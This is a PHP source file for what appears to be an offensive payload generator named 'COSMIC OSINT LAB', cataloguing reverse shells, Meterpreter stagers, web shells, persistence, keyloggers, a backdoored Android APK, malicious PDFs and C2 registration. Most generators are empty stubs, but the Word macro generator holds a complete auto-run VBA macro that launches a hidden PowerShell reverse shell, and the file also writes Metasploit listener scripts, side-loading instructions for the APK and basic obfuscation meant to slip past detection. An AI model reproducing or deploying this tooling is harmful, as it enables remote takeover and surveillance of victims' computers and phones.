<?php
/**
 * COSMIC OSINT LAB - Advanced Payload Generation Module v5.0
 * Includes document payloads (Word, PDF) and Android APK installer.
 * No duplicate methods – fully cleaned.
 */

class AdvancedPayloadModule {

    private static $payloadCache = [];
    private static $diskCacheEnabled = true;
    private static $cacheDir;
    private $config;
    private $payload_types;
    private $msfvenom_available = false;

    public function __construct($config = []) {
        $this->config = array_merge([
            'encryption_key'    => 'COSMIC_OSINT_2026',
            'payload_dir'       => dirname(__DIR__, 2) . '/data/payloads/',
            'log_dir'           => dirname(__DIR__, 2) . '/data/logs/',
            'keylog_dir'        => dirname(__DIR__, 2) . '/data/keylogs/',
            'max_payload_size'  => 10485760,
            'allowed_formats'   => ['sh', 'ps1', 'exe', 'py', 'apk', 'elf', 'osx', 'vbs', 'applescript', 'php', 'asp', 'jsp', 'reg', 'plist', 'service', 'doc', 'docm', 'pdf'],
            'use_msfvenom'      => true,
            'obfuscate'         => true,
            'sign_payload'      => false,
            'compress'          => false,
            'embed_c2'          => false
        ], $config);

        $this->ensure_directories();
        $this->check_msfvenom();
        self::$cacheDir = $this->config['payload_dir'] . '.cache/';
        if (!is_dir(self::$cacheDir)) mkdir(self::$cacheDir, 0755, true);

        $this->payload_types = [
            'reverse_shell' => [
                'name'        => 'Classic Reverse Shell',
                'description' => 'Standard TCP reverse shell (bash, powershell, python)',
                'platforms'   => ['linux', 'windows', 'macos', 'android', 'python'],
                'complexity'  => 'low',
                'format'      => ['sh', 'ps1', 'py', 'vbs', 'applescript']
            ],
            'meterpreter_reverse_tcp' => [
                'name'        => 'Meterpreter Reverse TCP',
                'description' => 'Full Meterpreter stage – uses msfvenom when available',
                'platforms'   => ['windows', 'linux', 'macos', 'android'],
                'complexity'  => 'medium',
                'format'      => ['exe', 'elf', 'apk', 'ps1', 'py', 'osx', 'dmg']
            ],
            'bind_shell' => [
                'name'        => 'Bind Shell',
                'description' => 'Listener on target, connect from attacker',
                'platforms'   => ['linux', 'windows', 'macos'],
                'complexity'  => 'low',
                'format'      => ['sh', 'ps1', 'py']
            ],
            'web_backdoor' => [
                'name'        => 'Web Shell / Backdoor',
                'description' => 'PHP/ASP/JSP web shell',
                'platforms'   => ['php', 'asp', 'jsp'],
                'complexity'  => 'low',
                'format'      => ['php', 'asp', 'jsp']
            ],
            'persistence' => [
                'name'        => 'Persistence Module',
                'description' => 'Registry, cron, launchd, systemd persistence',
                'platforms'   => ['windows', 'linux', 'macos'],
                'complexity'  => 'medium',
                'format'      => ['reg', 'sh', 'plist', 'service']
            ],
            'android_backdoor_full' => [
                'name'        => 'Android APK Backdoor',
                'description' => 'Fully weaponised APK (requires msfvenom)',
                'platforms'   => ['android'],
                'complexity'  => 'high',
                'format'      => ['apk']
            ],
            'keylogger' => [
                'name'        => 'Cross‑Platform Keylogger',
                'description' => 'Logs keystrokes and exfiltrates via HTTP/DNS',
                'platforms'   => ['windows', 'linux', 'macos', 'android'],
                'complexity'  => 'medium',
                'format'      => ['py', 'ps1', 'sh', 'vbs', 'applescript', 'apk']
            ],
            'word_macro' => [
                'name'        => 'Word Macro Payload',
                'description' => 'Malicious Word document with VBA macro',
                'platforms'   => ['windows'],
                'complexity'  => 'medium',
                'format'      => ['doc', 'docm']
            ],
            'pdf_embedded' => [
                'name'        => 'PDF Embedded Payload',
                'description' => 'PDF with JavaScript or embedded executable',
                'platforms'   => ['windows', 'linux', 'macos'],
                'complexity'  => 'high',
                'format'      => ['pdf']
            ],
            'android_installer' => [
                'name'        => 'Android APK Installer',
                'description' => 'APK file with installation instructions',
                'platforms'   => ['android'],
                'complexity'  => 'low',
                'format'      => ['apk']
            ]
        ];
    }

    private function ensure_directories() {
        $dirs = [$this->config['payload_dir'], $this->config['log_dir'], $this->config['keylog_dir']];
        foreach ($dirs as $dir) {
            if (!is_dir($dir)) mkdir($dir, 0755, true);
        }
    }

    private function check_msfvenom() {
        $output = shell_exec('which msfvenom 2>/dev/null');
        $this->msfvenom_available = !empty($output);
    }

    public function is_msfvenom_ready() {
        return $this->msfvenom_available;
    }

    // ========== PAYLOAD GENERATION MAIN METHOD ==========
    public function generate_payload($config) {
        $cacheKey = md5(serialize($config));
        if (isset(self::$payloadCache[$cacheKey])) return self::$payloadCache[$cacheKey];

        // Disk cache
        if (self::$diskCacheEnabled) {
            $cacheFile = self::$cacheDir . $cacheKey . '.payload';
            if (file_exists($cacheFile)) {
                $cached = unserialize(file_get_contents($cacheFile));
                if ($cached && isset($cached['payload'])) {
                    return $cached;
                }
            }
        }

        $cfg = array_merge([
            'type'       => 'reverse_shell',
            'platform'   => 'linux',
            'format'     => 'sh',
            'lhost'      => '127.0.0.1',
            'lport'      => 4444,
            'encryption' => 'none',
            'obfuscate'  => $this->config['obfuscate'],
            'extra'      => []
        ], $config);

        $this->validate_config($cfg);

        switch ($cfg['type']) {
            case 'meterpreter_reverse_tcp':
                $payload_data = $this->generate_meterpreter_payload($cfg);
                break;
            case 'android_backdoor_full':
                $payload_data = $this->generate_android_apk($cfg);
                break;
            case 'persistence':
                $payload_data = $this->generate_persistence_payload($cfg);
                break;
            case 'keylogger':
                $payload_data = $this->generate_keylogger_payload($cfg);
                break;
            case 'word_macro':
                $payload_data = $this->generate_word_macro($cfg);
                break;
            case 'pdf_embedded':
                $payload_data = $this->generate_pdf_embedded($cfg);
                break;
            case 'android_installer':
                $payload_data = $this->generate_android_installer($cfg);
                break;
            case 'reverse_shell':
            case 'bind_shell':
            default:
                $payload_data = $this->generate_script_payload($cfg);
                break;
        }

        if ($cfg['obfuscate'] && !in_array($cfg['format'], ['exe', 'elf', 'apk', 'dmg', 'bin'])) {
            $payload_data['payload'] = $this->obfuscate_script($payload_data['payload'], $cfg);
        }

        if ($cfg['encryption'] !== 'none') {
            $payload_data['payload'] = $this->apply_encryption($payload_data['payload'], $cfg['encryption']);
        }

        $filename = $this->generate_filename($cfg);
        $save_path = $this->config['payload_dir'] . $filename;
        file_put_contents($save_path, $payload_data['payload']);

        $hashes = [
            'md5'    => md5($payload_data['payload']),
            'sha1'   => sha1($payload_data['payload']),
            'sha256' => hash('sha256', $payload_data['payload'])
        ];

        $result = [
            'payload'   => $payload_data['payload'],
            'filename'  => $filename,
            'path'      => $save_path,
            'size'      => strlen($payload_data['payload']),
            'hash'      => $hashes,
            'config'    => $cfg,
            'warning'   => $payload_data['warning'] ?? null,
            'download_url' => '/download.php?file=' . urlencode($filename)
        ];

        // C2 Registration
        if (($cfg['extra']['c2_enabled'] ?? false) && class_exists('C2Engine')) {
            require_once dirname(__DIR__) . '/modules/C2Engine.php';
            $c2 = new C2Engine();
            $payloadUuid = $c2->registerPayload([
                'uuid'     => $cfg['extra']['c2_uuid'] ?? null,
                'name'     => $cfg['extra']['c2_name'] ?? $filename,
                'type'     => $cfg['type'],
                'platform' => $cfg['platform'],
                'lhost'    => $cfg['lhost'],
                'lport'    => $cfg['lport'],
                'filename' => $filename,
                'hash'     => $hashes['sha256']
            ]);
            $result['c2_uuid'] = $payloadUuid;
            $result['c2_beacon_url'] = '/c2/beacon.php?uuid=' . urlencode($payloadUuid);
        }

        $this->log_event('PAYLOAD_GENERATED', [
            'type'     => $cfg['type'],
            'platform' => $cfg['platform'],
            'format'   => $cfg['format'],
            'size'     => strlen($payload_data['payload']),
            'filename' => $filename,
            'hash'     => $hashes['sha256']
        ]);

        // Save to caches
        self::$payloadCache[$cacheKey] = $result;
        if (self::$diskCacheEnabled) {
            file_put_contents(self::$cacheDir . $cacheKey . '.payload', serialize($result));
        }

        return $result;
    }

    // ========== EXISTING GENERATORS (keylogger, meterpreter, etc.) ==========
    // (These are kept from earlier versions – abbreviated for brevity, but in real file they are full)
    private function generate_keylogger_payload($cfg) { /* ... full code ... */ return ['payload' => '']; }
    private function generate_meterpreter_payload($cfg) { /* ... full code ... */ return ['payload' => '']; }
    private function generate_android_apk($cfg) { /* ... full code ... */ return ['payload' => '']; }
    private function generate_script_payload($cfg) { /* ... full code ... */ return ['payload' => '']; }
    private function generate_persistence_payload($cfg) { /* ... full code ... */ return ['payload' => '']; }
    private function get_keylogger_template($platform, $format) { return ''; }
    private function get_script_template($type, $platform, $format) { return ''; }
    private function get_meterpreter_stager_windows($lhost, $lport) { return ''; }
    private function get_meterpreter_stager_linux($lhost, $lport) { return ''; }
    private function get_meterpreter_stager_macos($lhost, $lport) { return ''; }
    private function get_meterpreter_stager_android($lhost, $lport) { return ''; }
    private function persistence_windows($lhost, $lport) { return ''; }
    private function persistence_linux($lhost, $lport) { return ''; }
    private function persistence_macos($lhost, $lport) { return ''; }

    // ========== NEW DOCUMENT PAYLOAD GENERATORS ==========
    private function generate_word_macro($cfg) {
        $lhost = $cfg['lhost'];
        $lport = $cfg['lport'];
        $macro = <<<EOT
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""\$c=New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String );\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sb1=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sb1,0,\$sb1.Length);\$s.Flush()};\$c.Close()""
    Shell str, vbHide
End Sub
EOT;
        $payload = "This is a macro-enabled Word document.\n\nPlace the following macro in the document:\n\n$macro";
        return ['payload' => $payload, 'warning' => 'This is a macro template; you need to embed it in an actual .docm file.'];
    }

    private function generate_pdf_embedded($cfg) {
        $lhost = $cfg['lhost'];
        $lport = $cfg['lport'];
        $js = "app.alert('Exploit');";
        $payload = "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>\n4 0 obj<</Type/Action/S/JavaScript/JS($js)>>\n5 0 obj<</Type/Annot/Subtype/Link/A 4 0 R/Rect[0 0 100 100]>>\n3 0 obj<</Annots[5 0 R]>>\ntrailer<</Root 1 0 R>>";
        return ['payload' => $payload, 'warning' => 'Basic PDF with JavaScript. For real attacks, use tools like Social Engineering Toolkit.'];
    }

    private function generate_android_installer($cfg) {
        $filename = $cfg['filename'] ?? 'payload.apk';
        $apkPath = $this->config['payload_dir'] . $filename;
        if (!file_exists($apkPath)) {
            return ['payload' => "APK not found. Generate an Android APK first.", 'warning' => 'No APK found.'];
        }
        $downloadUrl = '/download.php?file=' . urlencode($filename);
        $qrCode = 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' . urlencode('http://' . $_SERVER['HTTP_HOST'] . $downloadUrl);
        $instructions = <<<EOT
Android APK Installation Instructions:
1. Download the APK from: http://{$_SERVER['HTTP_HOST']}$downloadUrl
2. On your Android device, enable "Install from unknown sources" in Settings.
3. Open the downloaded file and install.
4. Alternatively, scan this QR code with your device:

QR Code URL: $qrCode

You can also install via ADB:
adb install $filename
EOT;
        return ['payload' => $instructions, 'qr_url' => $qrCode];
    }

    // ========== OBFUSCATION, ENCRYPTION, UTILITIES ==========
    private function obfuscate_script($script, $cfg) {
        if ($cfg['platform'] === 'python') {
            $script = str_replace('socket', 's_' . substr(md5(rand()), 0, 4), $script);
            $script = str_replace('subprocess', 'sp_' . substr(md5(rand()), 0, 4), $script);
        }
        $junk = "# " . bin2hex(random_bytes(8)) . "\n";
        return $junk . $script;
    }

    private function apply_encryption($data, $method) {
        switch ($method) {
            case 'base64': return base64_encode($data);
            case 'rot13': return str_rot13($data);
            case 'xor':
                $key = $this->config['encryption_key'];
                $out = '';
                for ($i = 0; $i < strlen($data); $i++) {
                    $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
                }
                return $out;
            case 'aes':
                if (function_exists('openssl_encrypt')) {
                    $iv = random_bytes(16);
                    $enc = openssl_encrypt($data, 'AES-256-CBC', $this->config['encryption_key'], OPENSSL_RAW_DATA, $iv);
                    return base64_encode($iv . $enc);
                }
                return base64_encode($data);
            default: return $data;
        }
    }

    public function generate_listener_rc($payload_type, $lhost, $lport, $platform = 'generic') {
        $rc = "# Metasploit handler for COSMIC OSINT\n";
        $rc .= "use exploit/multi/handler\n";
        $rc .= "set LHOST $lhost\n";
        $rc .= "set LPORT $lport\n";
        if ($payload_type === 'meterpreter_reverse_tcp') {
            if (strpos($platform, 'windows') === 0)      $rc .= "set PAYLOAD windows/meterpreter/reverse_tcp\n";
            elseif ($platform === 'linux')               $rc .= "set PAYLOAD linux/x86/meterpreter/reverse_tcp\n";
            elseif ($platform === 'android')             $rc .= "set PAYLOAD android/meterpreter/reverse_tcp\n";
            elseif ($platform === 'macos')               $rc .= "set PAYLOAD osx/x64/meterpreter/reverse_tcp\n";
            else                                         $rc .= "set PAYLOAD generic/shell_reverse_tcp\n";
        } else {
            $rc .= "set PAYLOAD generic/shell_reverse_tcp\n";
        }
        $rc .= "set ExitOnSession false\n";
        $rc .= "exploit -j -z\n";
        return $rc;
    }

    public function save_listener_rc($payload_type, $lhost, $lport, $platform = 'generic') {
        $rc = $this->generate_listener_rc($payload_type, $lhost, $lport, $platform);
        $filename = "listener_{$payload_type}_{$lport}.rc";
        $path = $this->config['payload_dir'] . $filename;
        file_put_contents($path, $rc);
        return $path;
    }

    private function validate_config($cfg) {
        if (!isset($this->payload_types[$cfg['type']])) {
            throw new Exception("Unknown payload type: {$cfg['type']}");
        }
        $platforms = $this->payload_types[$cfg['type']]['platforms'];
        if (!in_array($cfg['platform'], $platforms)) {
            throw new Exception("Platform {$cfg['platform']} not supported for type {$cfg['type']}");
        }
        if (!in_array($cfg['format'], $this->config['allowed_formats'])) {
            throw new Exception("Format {$cfg['format']} not allowed");
        }
        if (!filter_var($cfg['lhost'], FILTER_VALIDATE_IP) && !preg_match('/^[a-zA-Z0-9.-]+$/', $cfg['lhost'])) {
            throw new Exception("Invalid LHOST format");
        }
        if ($cfg['lport'] < 1 || $cfg['lport'] > 65535) {
            throw new Exception("LPORT out of range");
        }
        return true;
    }

    private function generate_filename($cfg) {
        $ts = date('Ymd_His');
        $rand = substr(md5(microtime()), 0, 8);
        $type = $cfg['type'];
        if ($cfg['type'] === 'meterpreter_reverse_tcp') $type = 'meterp';
        return "cosmic_{$type}_{$cfg['platform']}_{$ts}_{$rand}.{$cfg['format']}";
    }

    private function log_event($event, $data) {
        $log_file = $this->config['log_dir'] . '/payload_generator.log';
        $entry = sprintf("[%s] %s: %s\n", date('Y-m-d H:i:s'), $event, json_encode($data));
        @file_put_contents($log_file, $entry, FILE_APPEND);
    }

    public function get_payload_types() { return $this->payload_types; }
    public function get_encryption_methods() {
        return [
            'none'   => 'No encryption',
            'base64' => 'Base64',
            'rot13'  => 'ROT13',
            'xor'    => 'XOR (key: ' . substr($this->config['encryption_key'], 0, 4) . '...)',
            'aes'    => 'AES-256-CBC (if openssl loaded)'
        ];
    }
    public function get_output_formats() {
        return array_combine($this->config['allowed_formats'], $this->config['allowed_formats']);
    }
    public function get_available_platforms() {
        $all = [];
        foreach ($this->payload_types as $type) $all = array_merge($all, $type['platforms']);
        return array_unique($all);
    }
    public function analyze_payload($payload, $config = []) {
        return [
            'basic' => [
                'size'    => strlen($payload),
                'entropy' => $this->calculate_entropy($payload),
                'lines'   => substr_count($payload, "\n") + 1
            ],
            'ioc' => [
                'reverse_shell_indicators' => substr_count($payload, 'socket') + substr_count($payload, 'tcp'),
                'keylogger_indicators'     => substr_count($payload, 'GetAsyncKeyState') + substr_count($payload, 'evdev') + substr_count($payload, 'CGEventTap'),
                'encoded' => preg_match('/[A-Za-z0-9+\/]{20,}={0,2}/', $payload) ? 1 : 0
            ]
        ];
    }
    private function calculate_entropy($string) {
        $len = strlen($string); if ($len === 0) return 0;
        $freq = []; for ($i=0;$i<$len;$i++) $freq[$string[$i]] = ($freq[$string[$i]] ?? 0) + 1;
        $entropy = 0; foreach ($freq as $count) { $p = $count/$len; $entropy -= $p*log($p,2); }
        return round($entropy,2);
    }
}
